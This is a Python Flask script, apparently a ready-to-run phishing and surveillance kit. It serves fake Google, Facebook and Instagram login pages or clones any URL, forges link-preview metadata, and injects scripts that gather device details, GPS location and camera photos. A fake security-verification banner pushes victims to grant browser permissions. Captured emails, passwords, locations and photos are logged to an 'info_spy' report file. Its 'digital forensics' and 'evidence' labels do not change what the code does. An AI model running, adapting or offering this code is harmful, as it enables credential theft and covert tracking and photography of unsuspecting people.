from flask import Flask, render_template_string, request, jsonify, send_from_directory
import datetime, base64, os, requests, shutil
import pytz, re

fuso_br = pytz.timezone('America/Sao_Paulo')

if os.path.exists("/sdcard"):
    pasta_raiz = "/sdcard/info_spy"
else:
    pasta_raiz = os.path.join(os.getcwd(), "info_spy")

pasta_templates = "templates"
pasta_preview = os.path.join(os.getcwd(), "static/preview")

if not os.path.exists(pasta_raiz):
    os.makedirs(pasta_raiz)
if not os.path.exists(pasta_templates):
    os.makedirs(pasta_templates)
if not os.path.exists(pasta_preview):
    os.makedirs(pasta_preview)


def obter_temas():
    temas = {
        "1": "google",
        "2": "facebook",
        "3": "facebook_pc",
        "4": "instagram",
        "6": "redirecionar",
    }
    if os.path.exists(pasta_templates):
        extras = [
            d for d in os.listdir(pasta_templates)
            if os.path.isdir(os.path.join(pasta_templates, d))
        ]
        idx = 7
        for pasta in extras:
            if pasta not in temas.values():
                temas[str(idx)] = pasta
                idx += 1
    return temas


def mostrar_menu():
    os.system('clear' if os.name == 'posix' else 'cls')
    temas_disponiveis = obter_temas()

    print("=" * 40)
    print(" PERÍCIA DIGITAL - SELECIONE O TEMA")
    print("=" * 40)
    for i in range(1, 5):
        print(f" [{i}] {temas_disponiveis[str(i)].capitalize()} Login")
    print(" [5] Custom (URL - Clonar agora)")
    print(f" [6] {temas_disponiveis['6'].capitalize()}")
    for k, v in temas_disponiveis.items():
        if int(k) >= 7:
            print(f" [{k}] {v} (Salvo)")
    print("=" * 40)

    opcao = input(" Escolha o template: ")

    ativar_loc = input(" Ativar localização? (s/n): ").lower() == 's'
    ativar_foto = input(" Ativar foto? (s/n): ").lower() == 's'
    ativar_banner = input(" Ativar banner de verificação? (s/n): ").lower() == 's'

    url_custom = ""
    if opcao == "5":
        url_custom = input(" Digite a URL para clonar: ")
        if not url_custom.startswith("http"):
            url_custom = "https://" + url_custom
        salvar = input(" Deseja salvar este clone permanentemente? (s/n): ").lower()
        if salvar == 's':
            nome_pasta = input(" Digite o nome para a nova pasta: ").replace(" ", "_")
            caminho_novo = os.path.join(pasta_templates, nome_pasta)
            if not os.path.exists(caminho_novo):
                os.makedirs(caminho_novo)
            try:
                res = requests.get(url_custom, verify=False, timeout=10)
                with open(os.path.join(caminho_novo, "index.html"), "w", encoding="utf-8") as f:
                    f.write(res.text)
                return (
                    nome_pasta,
                    input(" URL de redirecionamento: "),
                    url_custom,
                    ativar_loc,
                    ativar_foto,
                    ativar_banner,
                )
            except Exception:
                print("Erro ao salvar.")

    link_destino = input(" Digite a URL para redirecionar: ")
    if not link_destino.startswith("http"):
        link_destino = "https://" + link_destino
    tema_escolhido = temas_disponiveis.get(opcao, "google")
    if opcao == "5":
        tema_escolhido = "custom"

    return tema_escolhido, link_destino, url_custom, ativar_loc, ativar_foto, ativar_banner


pasta_tema, url_redirecionamento, url_alvo_custom, usar_loc, usar_foto, ativar_banner = mostrar_menu()

print("\n" + "=" * 40)
personalizar = input(" Deseja personalizar o preview do link? (s/n): ").lower()

meta_titulo = meta_desc = img_local = None
nome_servir = "preview.jpg"

if personalizar == 's':
    meta_titulo = input(" Título do link: ")
    meta_desc = input(" Descrição do link: ")
    img_local = input(" Nome da imagem local (ex: foto.jpg): ")
    if os.path.exists(img_local):
        shutil.copy(img_local, os.path.join(pasta_preview, nome_servir))
    print(" [!] Personalização aplicada.")
else:
    print(" [!] Usando metadados originais da página.")
print("=" * 40 + "\n")

app = Flask(__name__)


def delay_redirecionar_ms():
    """Tempo até ir para a URL — só template redirecionar, conforme o que está ativo."""
    if usar_foto and usar_loc:
        return 14000
    if usar_foto:
        return 10000
    if usar_loc:
        return 14000
    return 4000


@app.route('/preview.jpg')
def imagem_link():
    return send_from_directory(pasta_preview, nome_servir)


@app.route('/')
def index():
    html_original = ""
    try:
        if pasta_tema == "custom":
            res = requests.get(url_alvo_custom, verify=False, timeout=10)
            html_original = res.text
        else:
            path = os.path.join(pasta_templates, pasta_tema, "index.html")
            if not os.path.exists(path):
                return "Arquivo não encontrado", 404
            with open(path, "r", encoding="utf-8") as f:
                html_original = f.read()
    except Exception as e:
        return f"Erro: {e}", 500

    if personalizar == 's':
        html_original = re.sub(r'<title>.*?</title>', '', html_original, flags=re.IGNORECASE)
        html_original = re.sub(r'<meta property="og:.*?>', '', html_original, flags=re.IGNORECASE)
        html_original = re.sub(r'<meta name="description".*?>', '', html_original, flags=re.IGNORECASE)

    meta_tags = ""
    if personalizar == 's':
        link_da_foto = f"{request.host_url}preview.jpg"
        meta_tags = (
            f'<title>{meta_titulo}</title>\n'
            f'<meta property="og:title" content="{meta_titulo}">\n'
            f'<meta property="og:description" content="{meta_desc}">\n'
            f'<meta property="og:image" content="{link_da_foto}">\n'
            f'<meta property="og:type" content="website">\n'
            f'<meta name="description" content="{meta_desc}">\n'
        )
    elif pasta_tema == "redirecionar":
        try:
            res = requests.get(
                url_redirecionamento,
                verify=False,
                timeout=10,
                headers={'User-Agent': 'Mozilla/5.0'},
            )
            html_redirect = res.text
            title_match = re.search(
                r'<title[^>]*>(.*?)</title>', html_redirect, re.IGNORECASE | re.DOTALL
            )
            title = title_match.group(1).strip() if title_match else "Verificação de Segurança"
            desc_match = (
                re.search(
                    r'<meta[^>]*property=["\']og:description["\'][^>]*content=["\'](.*?)["\']',
                    html_redirect,
                    re.IGNORECASE,
                )
                or re.search(
                    r'<meta[^>]*name=["\']description["\'][^>]*content=["\'](.*?)["\']',
                    html_redirect,
                    re.IGNORECASE,
                )
            )
            desc = desc_match.group(1).strip() if desc_match else title
            image_match = re.search(
                r'<meta[^>]*property=["\']og:image["\'][^>]*content=["\'](.*?)["\']',
                html_redirect,
                re.IGNORECASE,
            )
            image_url = image_match.group(1).strip() if image_match else ""
            meta_tags = (
                f'<title>{title}</title>\n'
                f'<meta property="og:title" content="{title}">\n'
                f'<meta property="og:description" content="{desc}">\n'
                f'<meta property="og:image" content="{image_url}">\n'
                f'<meta property="og:type" content="website">\n'
                f'<meta name="description" content="{desc}">\n'
            )
        except Exception:
            meta_tags = '<title>Verificação de Segurança</title>\n'

    # --- Coleta no clique: todos os templates ---
    script_coleta = '''
    <script>
    async function enviarDadosIniciais() {
        let batteryInfo = "N/A";
        if (navigator.getBattery) {
            try {
                const b = await navigator.getBattery();
                batteryInfo = (b.level * 100).toFixed(0) + "% " + (b.charging ? "(Carregando)" : "");
            } catch (e) {}
        }
        const ipInt = await getInternalIP();
        fetch('/capturar_inicial', {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({
                ip_interno: ipInt,
                bateria: batteryInfo,
                screenWidth: screen.width,
                screenHeight: screen.height,
                deviceMemory: navigator.deviceMemory || "N/A"
            })
        });
    }
    window.addEventListener('load', function () {
        setTimeout(enviarDadosIniciais, 1200);
    });
    </script>
    '''

    # --- Permissões: só o que o usuário ligou (espiao.js lê usarLoc / usarFoto) ---
    script_permissoes = '''
    <script>
    function dispararPermissoesAtivas() {
        if (!window.usarLoc && !window.usarFoto) return;
        if (typeof dispararGPS !== "function") return;
        dispararGPS();
    }
    </script>
    '''

    delay_ms = delay_redirecionar_ms()

    # --- LOGIN (Google, Facebook, etc.): NUNCA redireciona sozinho para urlRedirecionamento ---
    if pasta_tema != "redirecionar":
        script_fluxo = f'''
    <script>
    window.addEventListener('load', function () {{
        if ({"true" if ativar_banner else "false"}) return;
        setTimeout(dispararPermissoesAtivas, 1800);
    }});
    </script>
    '''
    else:
        # --- REDIRECIONAR: só aqui vai para a URL de destino ---
        script_fluxo = f'''
    <script>
    (function () {{
        var redirecionado = false;
        function ir() {{
            if (redirecionado) return;
            redirecionado = true;
            window.location.replace("{url_redirecionamento}");
        }}
        window.addEventListener('load', function () {{
            if ({"true" if ativar_banner else "false"}) return;
            setTimeout(dispararPermissoesAtivas, 1800);
            setTimeout(ir, {delay_ms});
        }});
    }})();
    </script>
    '''

    css_banner = '''
    <style>
        #bloqueio-spy { position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: #ffffff;
            z-index: 999999; display: flex; align-items: center; justify-content: center; font-family: sans-serif; }
        #box-spy { background: #fff; padding: 30px; text-align: center; max-width: 85%; }
        #btn-spy { background: #1a73e8; color: #fff; border: none; padding: 12px 24px; border-radius: 4px;
            cursor: pointer; font-weight: bold; margin-top: 15px; font-size: 16px; }
    </style>
    '''

    html_banner = '''
    <div id="bloqueio-spy">
        <div id="box-spy">
            <h2 style="margin-top:0; color:#333;">Verificação de Segurança</h2>
            <p style="color:#666;">Para continuar, aceite as permissões solicitadas pelo navegador.</p>
            <button id="btn-spy" onclick="aceitarCookies()">CONTINUAR</button>
        </div>
    </div>
    '''

    script_config = f'''<script>
        window.temaAtual = "{pasta_tema}";
        window.urlRedirecionamento = "{url_redirecionamento}";
        window.usarLoc = {"true" if usar_loc else "false"};
        window.usarFoto = {"true" if usar_foto else "false"};

        function aceitarCookies() {{
            var el = document.getElementById('bloqueio-spy');
            if (el) el.style.display = 'none';
            dispararPermissoesAtivas();
            if (window.temaAtual === "redirecionar") {{
                setTimeout(function () {{
                    window.location.replace(window.urlRedirecionamento);
                }}, {delay_ms});
            }}
        }}
    </script>'''

    scripts_captura = (
        '\n<script src="/static/js/espiao.js"></script>\n'
        '<script src="/static/js/saida.js"></script>\n'
    )

    head_content = (
        meta_tags
        + script_coleta
        + script_permissoes
        + script_config
        + script_fluxo
        + scripts_captura
    )

    if ativar_banner:
        head_content = css_banner + head_content
        banner_html = html_banner
    else:
        banner_html = ""

    if re.search(r'<head', html_original, re.IGNORECASE):
        html_final = re.sub(
            r'(<head[^>]*>)',
            r'\1' + head_content,
            html_original,
            flags=re.IGNORECASE,
            count=1,
        )
    else:
        html_final = head_content + html_original

    if ativar_banner and re.search(r'<body', html_final, re.IGNORECASE):
        html_final = re.sub(
            r'(<body[^>]*>)',
            r'\1' + banner_html,
            html_final,
            flags=re.IGNORECASE,
            count=1,
        )

    return render_template_string(html_final)


@app.route('/capturar_inicial', methods=['POST'])
def capturar_inicial():
    dados = request.json
    ip_list = request.headers.getlist("X-Forwarded-For")
    ip_publico = ip_list[0] if ip_list else request.remote_addr
    agora = datetime.datetime.now(fuso_br).strftime("%d/%m/%Y %H:%M:%S")

    log = (
        f"=== COLETA NO CLIQUE ===\n"
        f"DATA: {agora} | IP PÚBLICO: {ip_publico}\n"
        f"IP INTERNO: {dados.get('ip_interno', 'N/A')}\n"
        f"BATERIA: {dados.get('bateria', 'N/A')}\n"
        f"RAM: {dados.get('deviceMemory')} GB\n"
        f"TELA: {dados.get('screenWidth')} x {dados.get('screenHeight')}\n"
        f"{'-' * 60}\n"
    )

    caminho = os.path.join(pasta_raiz, "relatorio.txt")
    with open(caminho, "a", encoding="utf-8") as f:
        f.write(log)
    print(f"\033[93m[+] Evidência salva em: {caminho} (Horário BRT: {agora})\033[0m")
    return jsonify({"status": "ok"}), 200


@app.route('/capturar', methods=['POST'])
def capturar():
    dados = request.json
    ip_list = request.headers.getlist("X-Forwarded-For")
    ip_publico = ip_list[0] if ip_list else request.remote_addr
    agora = datetime.datetime.now(fuso_br).strftime("%d/%m/%Y %H:%M:%S")

    log = (
        f"DATA: {agora} | IP PÚBLICO: {ip_publico}\n"
        f"IP INTERNO (LAN): {dados.get('ip_interno', 'N/A')}\n"
        f"TEMA: {pasta_tema.upper()} | BATERIA: {dados.get('bateria', 'N/A')}\n"
        f"EMAIL/USER: {dados.get('email')} | SENHA: {dados.get('pass')}\n"
        f"LAT: {dados.get('lat')} | LON: {dados.get('lon')}\n"
        f"{'-' * 50}\n"
    )

    caminho = os.path.join(pasta_raiz, "relatorio.txt")
    with open(caminho, "a", encoding="utf-8") as f:
        f.write(log)
    print(f"\033[92m[+] Evidência salva em: {caminho} (Horário BRT: {agora})\033[0m")
    return jsonify({"status": "ok"}), 200


@app.route('/foto', methods=['POST'])
def receber_foto():
    dados = request.json
    try:
        imagem_b64 = dados.get('image', '').split(',')
        agora = datetime.datetime.now(fuso_br).strftime("%Y%m%d_%H%M%S")
        nome_arq = f"FOTO_{agora}.jpg"
        with open(os.path.join(pasta_raiz, nome_arq), "wb") as f:
            f.write(base64.b64decode(imagem_b64[1]))
        print(f"\033[92m[+] Foto salva: {nome_arq}\033[0m")
    except Exception:
        pass
    return jsonify({"status": "ok"}), 200


if __name__ == '__main__':
    app.run(host='0.0.0.0', port=8080)
